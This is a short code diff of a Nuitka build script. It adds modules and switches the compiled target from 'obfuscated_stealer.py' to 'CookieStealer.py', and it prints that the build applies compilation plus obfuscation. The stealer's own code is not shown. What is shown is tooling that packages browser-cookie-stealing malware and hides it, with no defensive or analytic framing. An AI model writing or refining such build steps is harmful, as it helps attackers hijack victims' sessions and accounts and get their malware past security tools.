@@ -52,12 +52,14 @@ def build_with_nuitka():
         '--include-module=sqlite3',
         '--include-module=json',
         '--include-module=base64',
+        '--include-module=threading',
+        '--include-module=time',
         
         # Performance optimizations
         '--python-flag=O',           # Optimize bytecode
         '--python-flag=-S',          # Don't import site module
         
-        'obfuscated_stealer.py'
+        'CookieStealer.py'
     ]
     
     print("Building with Nuitka (True compilation + obfuscation)...")
